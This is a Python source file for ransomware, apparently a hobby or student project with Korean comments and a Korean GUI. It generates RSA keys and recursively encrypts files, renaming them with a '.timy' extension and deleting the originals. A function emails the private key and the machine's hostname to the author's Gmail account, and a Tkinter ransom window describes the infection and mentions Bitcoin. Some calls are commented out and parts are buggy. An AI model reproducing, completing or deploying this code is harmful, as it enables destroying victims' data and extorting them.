# -*- coding: utf-8 -*- 
import rsa
from rsa.bigfile import *
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
#from email.MIMEText import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import socket
import sys
from tkinter import *

description = "당신은 랜섬웨어에 감염되었습니다.\n해당 랜섬웨어는 RSA 암호화 알고리즘을 사용해서 \n당신의 컴퓨터에 있는 특정 파일들을 암호화하는 랜섬웨어입니다.\n오른쪽에 보이는 리스트들은 암호화된 파일들의 목록입니다.\n만약 당신이 해당 파일들을 복구하고싶다면\n 리스트 밑에있는 빈 박스를 모두채우고\n 보내기버튼을 눌러주시길 바랍니다.\n입력한 메일주소로 복호화 툴이 전송될 것입니다."

description2 = "비트코인은 전자화폐의 일종으로 다음 주소에서\n 자세한 정보를 얻을 수 있습니다.\nhttps://ko.wikipedia.org/wiki/비트코인"

Encrypted_file_list = []


def send_email(privkey):
    sender = '@gmail.com'
    receiver = '@gmail.com'
    password = ''
    computer_hostname = socket.gethostname()
    msg = MIMEMultipart()
    msg['Subject'] = "PrivateKey From : " + computer_hostname
    msg['From'] = sender
    msg['To'] = receiver

    attach = 'private000.pem'
    out = open(attach,'wb')
    out.write(privkey)
    out.close()
    
    part = MIMEBase('application', 'outer-stream')
    part.set_payload(open('private000.pem','rb').read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach))
    
    msg.attach(part)
    
    server = smtplib.SMTP_SSL("smtp.gmail.com",465)
    server.ehlo()
    server.login(sender,password)
    server.sendmail(sender,receiver,msg.as_string())
    server.close()
    os.remove(attach)
    
def censor_ext(filename):
    extension = ['hwp','zip','7z','doc','docx','ppt','xlsx','pages','py','html','c','java','js','txt','pdf','pptx','exe','mp3','mp4','mkv','avi','jpg','jpeg','png','ogg']
    ext = os.path.splitext(filename)[-1]
    ext = string.strip('.')
    ext = ext.lower()
    if ext in extension:
        return TRUE
    return FALSE

def search(key,dirname,mode):
    try:
        filenames = os.listdir(dirname)
        for filename in filenames:
            full_filename = os.path.join(dirname, filename)
            if os.path.isdir(full_filename):
                search(key,full_filename,mode)
            else:
#                if censor_ext(full_filename) == FALSE:
#                    continue
                if mode == "enc":
                    encrypt_file(key,full_filename)
                elif mode == "dec":
                    decrypt_file(key,full_filename)
    except PermissionError:
        pass
        
        
def encrypt_file(pubkey, filename):
    with open(filename, 'rb') as infile, open(filename+'.timy','wb') as outfile:
        encrypt_bigfile(infile,outfile,pubkey)
    Encrypted_file_list.append(filename)
    os.remove(filename)
    
def decrypt_file(privkey, filename):
    with open(filename,'rb') as infile, open(filename[:-5],'wb') as outfile:
        decrypt_bigfile(infile,outfile,privkey)    
    os.remove(filename)

    

(pubkey, privkey) = rsa.newkeys(512, poolsize=2) #키 생성, poolsize는 코어수
#너무 오래걸리면 OpenSSL을 사용할 수 있음, 사이트 참고


file = 'hello Im ransomeware'.encode('utf8')
#encode  file as an UTF-8, RSA module only operates on bute and not on string, so this step is necessary
#with open('key.pem',mode='rb') as privatefile:
#   keydata = privatefile.read()
#privkey = rsa.PrivateKey.load_pkcs1(keydata)


crypto = rsa.encrypt(file, pubkey)
#encrypt file by public key
#can encrypt less than the key, so 512-bit key can encode 53-byte message

decrypto = rsa.decrypt(crypto, privkey)
#decrypt file by private key

print(decrypto.decode('utf8'))
print('\n')




#out = open('private000.pem','wb')
#out.write(str(pubkey))
#out.close()
#out = open('public000.pem','wb')
#out.write(str(pubkey))
#out.close()

save_privkey = privkey.save_pkcs1('PEM')
#out = open('private000.pem','wb')
#out.write(a)
#out.close()
#send_email(save_privkey)

a = pubkey.save_pkcs1('PEM')
out = open('public000.pem','wb')
out.write(a)
out.close()
# start

#search(pubkey,".","enc")

class MyFrame(Frame):
    def __init__(self, master):
        Frame.__init__(self,master)
        
        self.master = master
        self.master.title("랜섬웨어")
        self.pack(fill=BOTH, expand=True)
        
        frame1 = Frame(self)
        frame1.pack()
        
        lbl1 = Label(frame1, text=description, width = 40, height = 8, anchor = N,justify=LEFT)
        lbl1.pack(side=LEFT, padx=10, pady=10)
        
        encrypted_list = Listbox(frame1, width = 40, height = 8)
        Encrypted_file_list.sort()
        for index in range(1,len(Encrypted_file_list)):
            encrypted_list.insert(index,Encrypted_file_list[index-1])
        encrypted_list.pack(side=RIGHT, padx=10, pady=10)
        
        
        frame2 = Frame(self)
        frame2.pack()
        
        frame2_0 = Frame(frame2, width = 40, height = 8)
        frame2_0.pack(side=LEFT)
        
        lbl2 = Label(frame2_0, text=description2, width = 40, height = 8, anchor = NW,justify=LEFT)
        lbl2.pack(side=LEFT,padx=10, pady=10)
        
        frame2_1 = Frame(frame2, width = 40, height= 8)
        frame2_1.pack(side=RIGHT)
        
        lblEmail = Label(frame2_1, text="당신의 이메일주소", width=10)
        lblEmail.pack(side=LEFT, padx=10, pady=10)
        
        entryEmail = Entry(frame2_1)
        entryEmail.pack(side=RIGHT,fill=X, padx=10, pady=10)
        
        
        frame2_1_0 = Frame(frame2_1)
        frame2_1_0
        btnSend = Button(frame2_1_0, text="보내기")
        btnSend.pack( padx=10, pady=10)
        
        
        
        
        
        
def main():
    root = Tk()
    root.geometry('800x400+10+10')
    myframe = MyFrame(root)
    root.mainloop()

if __name__ == '__main__':
    main()

#http://pythonstudy.xyz/python/article/121-Tkinter-위젯
